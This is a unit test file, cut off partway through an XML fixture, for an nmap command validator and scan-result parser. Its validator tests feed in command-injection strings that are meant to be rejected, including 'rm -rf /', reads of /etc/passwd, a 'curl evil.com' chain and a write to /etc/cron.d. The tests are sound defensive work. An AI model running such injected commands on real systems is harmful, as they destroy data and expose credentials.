"""Unit tests for the nmap command validator and XML parser."""
import os
import sys
import textwrap
import tempfile
import pytest

# Make sure the backend package is importable from the tests directory
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from scanner import validate_nmap_command, parse_nmap_xml


# ── validate_nmap_command ─────────────────────────────────────────────────────

class TestValidateNmapCommand:

    def test_valid_basic(self):
        ok, msg = validate_nmap_command("nmap -sV 192.168.1.1")
        assert ok is True
        assert msg == ""

    def test_valid_sudo(self):
        ok, _ = validate_nmap_command("sudo nmap -O 10.0.0.1")
        assert ok is True

    def test_valid_with_flags(self):
        ok, _ = validate_nmap_command("nmap -A -T4 --script=vuln scanme.nmap.org")
        assert ok is True

    def test_valid_full_port(self):
        ok, _ = validate_nmap_command("nmap -p- --open -T4 192.168.1.0/24")
        assert ok is True

    def test_invalid_empty(self):
        ok, msg = validate_nmap_command("")
        assert ok is False
        assert "Empty" in msg

    def test_invalid_non_nmap(self):
        ok, msg = validate_nmap_command("ls -la /etc/passwd")
        assert ok is False
        assert "Only nmap" in msg

    def test_invalid_semicolon(self):
        ok, msg = validate_nmap_command("nmap -sV target; rm -rf /")
        assert ok is False
        assert ";" in msg

    def test_invalid_pipe(self):
        ok, msg = validate_nmap_command("nmap -sV target | cat /etc/passwd")
        assert ok is False

    def test_invalid_ampersand(self):
        ok, msg = validate_nmap_command("nmap -sV target && curl evil.com")
        assert ok is False

    def test_invalid_backtick(self):
        ok, msg = validate_nmap_command("nmap `whoami`")
        assert ok is False

    def test_invalid_dollar_paren(self):
        ok, msg = validate_nmap_command("nmap $(cat /etc/passwd)")
        assert ok is False

    def test_invalid_redirect(self):
        ok, msg = validate_nmap_command("nmap -sV target > /etc/cron.d/evil")
        assert ok is False

    def test_invalid_sudo_non_nmap(self):
        ok, msg = validate_nmap_command("sudo bash -c 'id'")
        assert ok is False

    def test_whitespace_stripped(self):
        ok, _ = validate_nmap_command("  nmap -sn 10.0.0.0/8  ")
        assert ok is True


# ── parse_nmap_xml ────────────────────────────────────────────────────────────

MINIMAL_XML = textwrap.dedent("""\
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE nmaprun>
    <nmaprun scanner="nmap" version="7.94" args="nmap -sV 127.0.0.1"
             startstr="Mon Jan  1 00:00:00 2024">
      <scaninfo type="connect" protocol="tcp" numservices="1000" services="1-1000"/>
      <host>
        <status state="up" reason="syn-ack"/>
        <address addr="127.0.0.1" addrtype="ipv4"/>
        <hostnames>
          <hostname name="localhost" type="PTR"/>
        </hostnames>
        <ports>
          <port protocol="tcp" portid="22">
            <state state="open" reason="syn-ack"/>
            <service name="ssh" product="OpenSSH" version="9